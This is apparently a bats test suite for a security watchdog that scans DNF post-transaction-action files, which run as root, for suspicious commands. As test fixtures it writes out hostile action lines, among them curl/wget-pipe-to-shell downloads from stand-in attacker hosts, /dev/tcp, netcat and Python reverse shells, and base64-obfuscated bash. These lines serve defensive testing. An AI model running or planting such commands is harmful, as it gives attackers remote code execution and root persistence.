#!/usr/bin/env bats
# L2 bats functional tests for the dnf-plugins-watchdog scan script.
#
# DNF's post-transaction-actions plugin runs the command in each
# /etc/dnf/plugins/post-transaction-actions.d/*.action file
# (`package-glob:transaction-state:command`) AS ROOT after a matching
# package transaction — a package-transaction-triggered exec surface. An
# action command under a writable root, relative-with-slash, bare, or
# carrying an injection pattern is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the plugin
# / actions dirs in a tmp sandbox via SELFDEF_DNFPLUG_D / _ACTIONS.
#
# Run with: bats packaging/test/L2-dnf-plugins-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd/dnf-plugins-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    PLUGD="${TMP}/plugins"; mkdir -p "${PLUGD}"
    ACTD="${TMP}/actions.d"; mkdir -p "${ACTD}"
    ACTION="${ACTD}/test.action"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DNFPLUG_PROFILE="${PROFILE:-report}" \
    SELFDEF_DNFPLUG_BASELINE="${BASELINE}" \
    SELFDEF_DNFPLUG_D="${PLUGD_D:-$PLUGD}" \
    SELFDEF_DNFPLUG_ACTIONS="${ACTIONS_D:-$ACTD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no dnf plugins/actions → ok / no_dnf_plugins" {
    PLUGD_D="${TMP}/none" ACTIONS_D="${TMP}/none.d" run_wd
    cap | grep -q '"event":"no_dnf_plugins"'
    cap | grep -q '"severity":"ok"'
}

@test "benign action, first run → ok / baseline_initial" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / dnf_plugins_intact" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dnf_plugins_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "an action command under a writable root → alert / dnf_plugins_suspicious" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd                                   # benign baseline
    printf '*:in:/tmp/.x\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dnf_plugins_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "an action carrying a curl|sh payload → alert" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:bash -c "curl http://evil|sh"\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a bare action command → alert" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:any:evilprog\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign action change → warn / dnf_plugins_changed" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:/usr/bin/dnf-utils\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dnf_plugins_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a /usr/bin action command is NOT flagged" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious action" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:/tmp/.x\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — dnf-plugins inventory enumerates post-transaction root-exec surface)" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in action → alert" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in action → alert" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:wget -qO- http://attacker/p | sh\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in action → alert" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:echo YmFzaCAtaQ== | base64 -d | bash\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (action under /var/tmp writable root): expands writable-root coverage" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:/var/tmp/.payload\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (action under /dev/shm): tmpfs-root payload coverage" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:/dev/shm/.payload\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable action file → alert; the file ITSELF, not just contents)" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    chmod 0666 "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-dnf-plugins -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): dnf-plugins-watchdog does NOT refresh baseline on suspicious-action detection — alert STAYS until operator updates" {
    # Post-transaction root-exec persistence — suspicious-action alert
    # MUST persist across runs until operator explicitly re-baselines.
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:/tmp/.x\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"dnf_plugins_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (relative-with-slash action 'sub/dir/p' → alert)" {
    # Relative-with-slash = PWD-at-exec attacker primitive.
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:sub/dir/evil\n' > "${ACTION}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:curl -s http://attacker.com/p | bash\n' > "${ACTION}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in dnf-plugins action: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
    # dhcpcd-hooks/display-manager-hooks nc reverse-shell variant
    # INVARIANTs across the brain. Lock the netcat axis on the
    # post-transaction-actions plugin surface (T1546 — DNF runs each
    # action command AS ROOT after a matching package transaction;
    # sister-vector to apt-hooks DPkg::Pre/Post-Invoke on the Debian
    # side).
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:nc -e /bin/sh 1.1.1.1 4444\n' > "${ACTION}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (action under /home: user-writable hijack on package-transaction trigger surface)" {
    # Sister to the /tmp + /var/tmp + /dev/shm writable-root axes
    # already locked. /home is the user-writable surface — an
    # attacker with regular user account can drop a malicious
    # binary into their home and have DNF exec it AS ROOT after
    # the next package transaction. Locks axis-symmetry across the
    # writable-root family on the post-transaction-action surface.
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:/home/user/.evil-action\n' > "${ACTION}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (DELTA detect — ADDED distinctive-attacker-named dnf-plugins action surfaces in sample for operator-triage routing)" {
    # Sister to many other watchdog DELTA-detect sample-naming
    # INVARIANTs across the brain. When an attacker drops a new
    # dnf-plugins post-transaction action file (T1546 — post-
    # transaction-trigger root-exec persistence; DNF runs action
    # commands AS ROOT after every package install/upgrade/
    # remove), the file path/name MUST surface in the JSON
    # sample so operator dashboard routes triage to the right
    # path.
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:/tmp/.evil\n' > "${ACTD}/distinctive-attacker-action.action"
    run_wd
    cap | grep -q 'distinctive-attacker-action'
}

@test "INVARIANT (action under /var/tmp — writable-root axis-symmetric expansion on dnf-plugins surface)" {
    # Sister to /tmp + /home action writable-root INVARIANTs
    # already locked. /var/tmp is writable by ALL users (sticky-
    # bit doesn't gate exec) AND persists across reboots (unlike
    # /tmp tmpfs on most distros). Attackers prefer it for boot-
    # survival persistence. The dnf-plugins action scanner MUST
    # recognize /var/tmp paths just as firmly as the /tmp + /home
    # family — locks axis-symmetric writable-root coverage on
    # the T1546 dnf-post-transaction-trigger root-exec surface.
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:/var/tmp/.evil-action\n' > "${ACTION}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (action under /dev/shm — tmpfs writable-root axis-symmetric expansion)" {
    # Sister to /tmp + /home + /var/tmp dnf-plugins action
    # writable-root INVARIANTs. /dev/shm tmpfs writable by ALL.
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:/dev/shm/.evil-action\n' > "${ACTION}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on dnf-plugins action surface)" {
    # Sister to nc / curl|bash / dev-tcp dnf-plugins action
    # rev-shell variants. Python on every RHEL/Fedora host
    # (dnf itself is Python). T1546 package-transaction-trigger
    # root-exec — actions run AS ROOT on every dnf operation.
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);pty.spawn(\\"/bin/sh\\")"\n' > "${ACTION}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}
